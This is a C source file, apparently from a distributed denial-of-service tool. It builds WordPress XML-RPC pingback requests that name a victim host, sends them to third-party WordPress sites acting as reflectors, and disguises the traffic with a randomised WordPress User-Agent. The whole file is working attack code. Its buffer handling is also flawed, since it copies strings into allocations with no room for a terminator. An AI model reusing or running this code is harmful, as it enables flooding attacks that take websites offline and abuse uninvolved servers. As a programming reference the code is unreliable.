#include "xml.h"
#include "flood.h"
#include "vector.h"
#include "payload.h"

char* xml_create_payload(const char* target_host, char* xml_host) {
  char xml_buf[512];
  ZERO_BUF(&xml_buf);

  snprintf(xml_buf,
    sizeof(xml_buf),
    "<methodCall><methodName>pingback.ping</methodName>"
    "<params><param><value><string>%s</string></value></param>"
    "<param><value><string>http://%s/?p=1</string></value></param>"
    "</params></methodCall>",
    target_host,
    xml_host
  );

  char* xml_payload = malloc(strlen(xml_buf));
  strncpy(xml_payload, xml_buf, strlen(xml_buf));
  return xml_payload;
}

char* xml_rand_wp() {
  uint8_t major_ver = (rand() & 0x4) + 1;
  uint8_t minor_ver = (rand() & 0x8) + 1;
  uint8_t build_ver = (rand() & 0x10) + 1;

  char version_buf[16];
  ZERO_BUF(&version_buf);
  snprintf(version_buf, sizeof(version_buf), "%d.%d.%d", major_ver, minor_ver, build_ver);

  char* rand_ptr = calloc(strlen(version_buf), sizeof(char));
  strncpy(rand_ptr, version_buf, strlen(version_buf));
  return rand_ptr;
}

char* xml_http_request(attack_t* attack_data, struct node* reflector) {
  char* xml_data = xml_create_payload(attack_data->target, reflector->host);
  char* rand_version = xml_rand_wp();
  char* http_template = "POST %s HTTP/1.1\r\n"
                        "Connection: close\r\n"
                        "Host: %s\r\n"
                        "User-Agent: WordPress/%s\r\n"
                        "Content-Type: text/xml\r\n"
                        "Content-Length: %d\r\n"
                        "\r\n%s";

  size_t http_req_sz = (strlen(http_template) + strlen(reflector->path) +
                        strlen(rand_version) + strlen(reflector->host) + strlen(xml_data) + 1);

  char http_request[http_req_sz];
  ZERO_BUF(&http_request);
  snprintf(http_request,
      sizeof(http_request),
      http_template,
      reflector->path,
      reflector->host,
      rand_version,
      strlen(xml_data),
      xml_data
  );
  free(xml_data);
  free(rand_version);

  char* http_request_ptr = calloc(strlen(http_request), sizeof(char));
  strncpy(http_request_ptr, http_request, strlen(http_request));
  return http_request_ptr;
}
